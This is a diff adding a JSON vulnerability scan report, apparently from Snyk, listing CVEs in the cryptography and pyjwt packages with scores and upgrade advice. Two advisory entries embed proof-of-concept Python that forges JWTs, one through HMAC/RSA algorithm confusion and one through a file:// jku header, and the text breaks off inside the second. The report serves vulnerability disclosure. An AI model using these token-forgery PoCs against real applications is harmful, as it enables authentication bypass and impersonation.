@@ -1,0 +1,2712 @@
+{
+  "vulnerabilities": [
+    {
+      "id": "SNYK-PYTHON-CRYPTOGRAPHY-15953315",
+      "title": "Out-of-bounds Write",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
+      "credit": [
+        "Unknown"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[45.0.0, 46.0.7)"
+        ]
+      },
+      "exploit": "Not Defined",
+      "fixedIn": [
+        "46.0.7"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 6.3,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "cryptography",
+      "references": [
+        {
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-p423-j2cm-9vmq",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/pyca/cryptography/commit/622d672e429a7cff836a23c5903683dbec1901f5",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+          "cvssV3BaseScore": 7.3,
+          "modificationTime": "2026-05-14T10:08:52.101723Z"
+        },
+        {
+          "assigner": "NVD",
+          "severity": "critical",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 9.8,
+          "modificationTime": "2026-04-15T18:16:31.005050Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 6.3,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-07-01T02:01:20.004106Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 4.8,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-01T02:01:20.004106Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+          "assigner": "Red Hat",
+          "severity": "high",
+          "baseScore": 7.3,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-05-14T10:08:52.101723Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "assigner": "NVD",
+          "severity": "critical",
+          "baseScore": 9.8,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-04-15T18:16:31.005050Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Out-of-bounds Write in the `update` function when non-contiguous buffers are provided as input. An attacker can cause memory corruption or unintended behavior by supplying specially crafted non-contiguous buffers to APIs that accept Python buffers. \r\n\r\n**Note:** This is only exploitable if the Python version is greater than 3.11.\n## Remediation\nUpgrade `cryptography` to version 46.0.7 or higher.\n## References\n- [GitHub Advisory](https://github.com/pyca/cryptography/security/advisories/GHSA-p423-j2cm-9vmq)\n- [GitHub Commit](https://github.com/pyca/cryptography/commit/622d672e429a7cff836a23c5903683dbec1901f5)\n",
+      "epssDetails": {
+        "percentile": "0.46581",
+        "probability": "0.00652",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-39892"
+        ],
+        "CWE": [
+          "CWE-787"
+        ],
+        "GHSA": [
+          "GHSA-p423-j2cm-9vmq"
+        ]
+      },
+      "packageName": "cryptography",
+      "proprietary": false,
+      "creationTime": "2026-04-09T08:07:31.859112Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-04-08T19:23:08Z",
+      "exploitDetails": {
+        "sources": [],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Not Defined",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Not Defined",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-04-09T13:10:50.293872Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-07-01T02:01:20.004106Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "alerta__alerta@0.0.0",
+        "cryptography@46.0.6"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "cryptography",
+      "version": "46.0.6"
+    },
+    {
+      "id": "SNYK-PYTHON-CRYPTOGRAPHY-17344551",
+      "title": "Out-of-bounds Read",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "credit": [
+        "Frank Buss"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[0.5,48.0.1)"
+        ]
+      },
+      "exploit": "Not Defined",
+      "fixedIn": [
+        "48.0.1"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "high",
+      "cvssScore": 8.7,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "cryptography",
+      "references": [
+        {
+          "url": "https://github.com/openssl/openssl/commit/e734e38ab606c62de2ee9410cb3222b99e6fc2e3",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-537c-gmf6-5ccf",
+          "title": "GitHub Security Advisory"
+        },
+        {
+          "url": "https://openssl-library.org/news/secadv/20260609.txt",
+          "title": "Vulnerability Advisory"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "SUSE",
+          "severity": "low",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "cvssV3BaseScore": 3.7,
+          "modificationTime": "2026-06-16T11:02:04.287862Z"
+        },
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:H",
+          "cvssV3BaseScore": 5,
+          "modificationTime": "2026-06-11T05:27:06.815158Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 8.7,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-07-10T02:01:07.616348Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-10T02:01:07.616348Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "assigner": "SUSE",
+          "severity": "low",
+          "baseScore": 3.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-16T11:02:04.287862Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:H",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-11T05:27:06.815158Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Out-of-bounds Read in the ASN.1 decoder. An attacker can crash the application or cause memory beyond the end of the input buffer to be loaded into the decoded ASN.1 object, by supplying very large input data. Applications that pass untrusted input to `d2i_X509()`, `d2i_PKCS7()`, or other `d2i_*` functions are affected. OpenSSL command line tools are not.\r\n\r\n**Note:** Only 64-bit Unix-like systems are vulnerable.\n## Remediation\nUpgrade `cryptography` to version 48.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/openssl/openssl/commit/e734e38ab606c62de2ee9410cb3222b99e6fc2e3)\n- [GitHub Security Advisory](https://github.com/pyca/cryptography/security/advisories/GHSA-537c-gmf6-5ccf)\n- [Vulnerability Advisory](https://openssl-library.org/news/secadv/20260609.txt)\n",
+      "epssDetails": {
+        "percentile": "0.39566",
+        "probability": "0.00513",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-34180"
+        ],
+        "CWE": [
+          "CWE-125"
+        ],
+        "GHSA": [
+          "GHSA-537c-gmf6-5ccf"
+        ]
+      },
+      "packageName": "cryptography",
+      "proprietary": false,
+      "creationTime": "2026-06-16T12:32:39.809014Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-06-09T18:33:21Z",
+      "exploitDetails": {
+        "sources": [],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Not Defined",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Not Defined",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-06-17T08:01:48.486285Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-07-10T02:01:07.616348Z",
+      "socialTrendAlert": true,
+      "severityWithCritical": "high",
+      "from": [
+        "alerta__alerta@0.0.0",
+        "cryptography@46.0.6"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "cryptography",
+      "version": "46.0.6"
+    },
+    {
+      "id": "SNYK-PYTHON-PYJWT-17053408",
+      "title": "Improper Authentication",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N/E:P",
+      "credit": [
+        "Arad Inbar"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.13.0)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.13.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "high",
+      "cvssScore": 8.8,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "pyjwt",
+      "references": [
+        {
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+          "cvssV3BaseScore": 7.4,
+          "modificationTime": "2026-06-05T17:03:53.400121Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+          "cvssV3BaseScore": 7.4,
+          "modificationTime": "2026-06-24T11:13:14.206309Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 8.8,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-07-03T14:06:52.367144Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 8.2,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-03T14:06:52.367144Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+          "assigner": "Red Hat",
+          "severity": "high",
+          "baseScore": 7.4,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-05T17:03:53.400121Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+          "assigner": "SUSE",
+          "severity": "high",
+          "baseScore": 7.4,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T11:13:14.206309Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Authentication when decoding JSON Web Tokens. An attacker can forge valid tokens by supplying a public key as the secret for the HMAC algorithm when both asymmetric and HMAC algorithms are supported.\n## PoC\n```python\nfrom jwt.api_jws import PyJWS\nimport json, base64, hmac, hashlib\n\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\")\n\n# Public RSA JWK (public by design)\nrsa_jwk_json = json.dumps({\"kty\":\"RSA\",\"n\":\"AQAB\",\"e\":\"AQAB\"})\n\n# Attacker-crafted token: flip to HS256 and choose claims\nheader  = b64u(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}')\npayload = b64u(b'{\"sub\":\"alice\",\"admin\":true}')\nsigning = header + b\".\" + payload\n\n# Sign with HMAC using the PUBLIC JWK JSON TEXT as the “secret”\nsig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest()\ntoken = (signing + b\".\" + b64u(sig)).decode()\n\n# Vulnerable verifier: mixed families + JWK JSON string as key\njws = PyJWS()\nprint(jws.decode(token, key=rsa_jwk_json, algorithms=[\"HS256\",\"RS256\"]))\n# -> b'{\"sub\":\"alice\",\"admin\":true}'\n```\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+      "epssDetails": {
+        "percentile": "0.31317",
+        "probability": "0.00394",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48526"
+        ],
+        "CWE": [
+          "CWE-287"
+        ],
+        "GHSA": [
+          "GHSA-xgmm-8j9v-c9wx"
+        ]
+      },
+      "packageName": "pyjwt",
+      "proprietary": false,
+      "creationTime": "2026-05-29T07:28:00.475438Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-05-28T16:50:06.686000Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-05-29T07:28:00.692526Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-07-03T14:06:52.367144Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "high",
+      "from": [
+        "alerta__alerta@0.0.0",
+        "pyjwt@2.12.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "pyjwt",
+      "version": "2.12.1"
+    },
+    {
+      "id": "SNYK-PYTHON-PYJWT-17053409",
+      "title": "Allocation of Resources Without Limits or Throttling",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
+      "credit": [
+        "Ali Firas (thesmartshadow)"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.13.0)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.13.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 6.9,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "pyjwt",
+      "references": [
+        {
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "cvssV3BaseScore": 5.3,
+          "modificationTime": "2026-06-05T09:50:42.863958Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "cvssV3BaseScore": 7.5,
+          "modificationTime": "2026-06-24T11:12:57.793578Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 6.9,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-06-24T11:12:58.433243Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 5.3,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T11:12:58.433243Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 5.3,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-05T09:50:42.863958Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "assigner": "SUSE",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T11:12:57.793578Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling via the Base64URL decoding process. An attacker can cause excessive CPU and memory consumption by supplying an arbitrarily large payload segment when verifying detached JWS tokens with the unencoded-payload option enabled.\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+      "epssDetails": {
+        "percentile": "0.20272",
+        "probability": "0.00288",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48525"
+        ],
+        "CWE": [
+          "CWE-770"
+        ],
+        "GHSA": [
+          "GHSA-w7vc-732c-9m39"
+        ]
+      },
+      "packageName": "pyjwt",
+      "proprietary": false,
+      "creationTime": "2026-05-29T07:34:49.244071Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-05-28T16:50:07.421000Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-05-29T07:34:49.458674Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-06-24T11:12:58.433243Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "alerta__alerta@0.0.0",
+        "pyjwt@2.12.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "pyjwt",
+      "version": "2.12.1"
+    },
+    {
+      "id": "SNYK-PYTHON-PYJWT-17054465",
+      "title": "Improper Cleanup on Thrown Exception",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+      "credit": [
+        "Unknown"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.13.0)"
+        ]
+      },
+      "exploit": "Not Defined",
+      "fixedIn": [
+        "2.13.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "medium",
+      "cvssScore": 6.3,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "pyjwt",
+      "references": [
+        {
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "cvssV3BaseScore": 5.9,
+          "modificationTime": "2026-06-05T09:49:35.625524Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "low",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "cvssV3BaseScore": 3.7,
+          "modificationTime": "2026-06-24T11:12:49.497141Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 6.3,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-06-24T11:12:49.893339Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "assigner": "Snyk",
+          "severity": "low",
+          "baseScore": 3.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T11:12:49.893339Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 5.9,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-05T09:49:35.625524Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "assigner": "SUSE",
+          "severity": "low",
+          "baseScore": 3.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T11:12:49.497141Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Cleanup on Thrown Exception via the `get_signing_key` function. An attacker can exhaust system resources by sending numerous JWTs with attacker-controlled `kid` values, causing repeated outbound requests to the JWKS endpoint.\n\n**Note:**\n\nThis is only exploitable if the JWKS fetch fails and the upstream endpoint does not implement effective rate limiting or error handling.\n## Remediation\nUpgrade `pyjwt` to version 2.13.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8)\n- [GitHub Commit](https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81)\n",
+      "epssDetails": {
+        "percentile": "0.12568",
+        "probability": "0.00222",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48524"
+        ],
+        "CWE": [
+          "CWE-460"
+        ],
+        "GHSA": [
+          "GHSA-fhv5-28vv-h8m8"
+        ]
+      },
+      "packageName": "pyjwt",
+      "proprietary": false,
+      "creationTime": "2026-05-29T07:38:09.130353Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-05-28T16:50:11.956000Z",
+      "exploitDetails": {
+        "sources": [],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Not Defined",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Not Defined",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-05-29T07:38:09.318424Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-06-24T11:12:49.893339Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "alerta__alerta@0.0.0",
+        "pyjwt@2.12.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "pyjwt",
+      "version": "2.12.1"
+    },
+    {
+      "id": "SNYK-PYTHON-PYJWT-17054901",
+      "title": "Unintended Proxy or Intermediary ('Confused Deputy')",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N/E:P",
+      "credit": [
+        "Keijo Tuominen"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,2.13.0)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "2.13.0"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "low",
+      "cvssScore": 2.1,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "pyjwt",
+      "references": [
+        {
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/jpadilla/pyjwt/commit/95791b1759b8aa4f2203575d344d5c78564cdc81",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+          "cvssV3BaseScore": 4.2,
+          "modificationTime": "2026-06-05T09:50:11.301233Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+          "cvssV3BaseScore": 4.8,
+          "modificationTime": "2026-06-24T11:12:45.723682Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "low",
+          "baseScore": 2.1,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-06-24T11:12:46.188502Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 4.2,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T11:12:46.188502Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+          "assigner": "Red Hat",
+          "severity": "medium",
+          "baseScore": 4.2,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-05T09:50:11.301233Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 4.8,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-06-24T11:12:45.723682Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Unintended Proxy or Intermediary ('Confused Deputy') via the `uri` parameter being passed directly to `urllib.request.urlopen`, which allows fetching resources using unsupported schemes such as `file`, `ftp`, and `data`. An attacker can access arbitrary local files or external resources and potentially forge tokens by supplying crafted URLs.\n\n**Note:**\n\nThis is only exploitable if the application's jku URL ingestion path accepts attacker-controlled URLs.\n## PoC\n```python\nimport jwt as pyjwt\nfrom jwt import PyJWKClient\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization\nimport json, base64, time\n\n# Attacker generates keypair (no relation to real IdP)\nkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npub_n = key.public_key().public_numbers().n\n\ndef b64u(n):\n    bl = (n.bit_length() + 7) // 8\n    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()\n\n# Attacker writes JWK Set containing their public key to /tmp\njwks = {\"keys\":[{\"kty\":\"RSA\",\"kid\":\"attacker\",\"use\":\"sig\",\"alg\":\"RS256\",\n                  \"n\":b64u(pub_n),\"e\":\"AQAB\"}]}\nwith open(\"/tmp/attacker.json\",\"w\") as f:\n    json.dump(jwks, f)\n\n# Attacker mints token signed with their private key, jku=file://\npriv_pem = key.private_bytes(serialization.Encoding.PEM,\n    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())\nnow = int(time.time())\ntoken = pyjwt.encode(\n    {\"sub\":\"attacker\",\"aud\":\"target-app\",\"iat\":now,\"exp\":now+3600},\n    priv_pem, algorithm=\"RS256\",\n    headers={\"kid\":\"attacker\",\"jku\":\"file:///tmp/attacker.json\",\"typ\":\"JWT\"})\n\n# Vulnerable application pattern: caller derives jku from token header\n# and passes to PyJWKClient without 